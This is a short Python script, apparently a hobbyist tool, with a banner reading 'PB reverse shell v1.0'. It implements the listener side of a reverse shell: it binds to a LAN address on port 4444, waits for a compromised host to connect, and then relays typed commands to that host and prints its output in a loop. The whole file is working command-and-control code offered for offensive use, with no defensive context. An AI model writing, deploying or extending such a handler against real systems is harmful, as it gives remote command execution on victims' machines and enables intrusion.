"""
 _____  ____                                           _          _ _
|  __ \|  _ \                                         | |        | | |
| |__) | |_) |  _ __ _____   _____ _ __ ___  ___   ___| |__   ___| | |
|  ___/|  _ <  | '__/ _ \ \ / / _ \ '__/ __|/ _ \ / __| '_ \ / _ \ | |
| |    | |_) | | | |  __/\ V /  __/ |  \__ \  __/ \__ \ | | |  __/ | |
|_|    |____/ _|_|  \___| \_/ \___|_|  |___/\___| |___/_| |_|\___|_|_|
        /_ | / _ \
__   __  | || | | |
\ \ / /  | || | | |
 \ V /   | || |_| |
  \_/    |_(_)___/
"""

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def start():
    print()
    server.bind(('192.168.1.114',4444))
    server.listen(10)
    print("Bind completed")
    client_socket, address = server.accept()
    return client_socket
def send(client):
    command = input("command: ").encode('utf-8')
    client.send(command)
def recv(client):
        data = client.recv(4096).decode('utf-8')
        print(data)

if __name__=="__main__":
    client = start()
    while True:
        send(client)
        recv(client)